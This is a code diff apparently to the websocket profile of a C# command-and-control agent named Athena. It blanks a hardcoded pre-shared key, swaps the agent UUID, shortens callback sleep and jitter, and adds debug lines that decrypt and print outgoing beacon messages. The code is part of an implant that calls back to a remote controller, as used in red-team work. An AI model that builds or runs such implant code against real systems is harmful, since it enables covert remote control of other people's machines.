@@ -44,13 +44,15 @@ namespace Athena
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "rpfZ1fwiz8pXXy33eDYW7bU6iZLjezOhObwqQHy4/cE=";
+            //this.psk = "rpfZ1fwiz8pXXy33eDYW7bU6iZLjezOhObwqQHy4/cE=";
+            this.psk = "";
             this.encryptedExchangeCheck = bool.Parse("false");
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 3;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 2;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 3;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 2;
             this.jitter = jitter;
-            this.uuid = "5ccee0dc-7606-4c7b-8940-6f3c6f77d13c";
+            //this.uuid = "5ccee0dc-7606-4c7b-8940-6f3c6f77d13c";
+            this.uuid = "eb29e770-644a-4029-9935-0602c19c5665";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
@@ -184,6 +186,7 @@ namespace Athena
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
+                    Debug.WriteLine($"[{DateTime.Now}] Decrypting and printing message: {this.crypt.Decrypt(json)}");
                 }
                 else
                 {
@@ -198,6 +201,7 @@ namespace Athena
                 };
 
                 string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
+                Debug.WriteLine($"[{DateTime.Now}] Final Message: {message}");
                 byte[] msg = Encoding.UTF8.GetBytes(message);
                 Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
